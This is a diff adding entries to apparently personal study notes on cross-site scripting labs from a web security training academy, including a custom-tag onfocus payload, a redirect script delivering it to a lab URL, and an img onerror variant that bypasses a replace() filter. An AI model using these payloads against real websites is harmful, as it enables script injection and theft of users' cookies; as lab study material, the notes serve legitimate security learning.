@@ -59,6 +59,19 @@ value="[PAYLOAD HERE]">
 
 
 
+### Reflected XSS into HTML context with all tags blocked except custom ones
+Payload: `<custom-tag id=x onfocus=alert(document.cookie) tabindex=1>#x`
+
+```
+<script>
+location = 'https://0af9006b0401a5dc827b5bd100ca00a8.web-security-academy.net/?search=%3Cxss+id%3Dx+onfocus%3Dalert%28document.cookie%29%20tabindex=1%3E#x';
+</script>
+```
+
+
+
+
+
 
 
 
@@ -123,7 +136,9 @@ The "sinks" manipulate the DOM, and then the DOM causes the JavaScript to execut
 
 - innerHTML sink using source location.search
 `<img src=1 onerror=alert(1)>`
+`<><img src=1 onerror=alert(1)>` Example: to bypass `.replace()` method
 `<img src='0' onerror=alert(1)>`
+
 
 
 
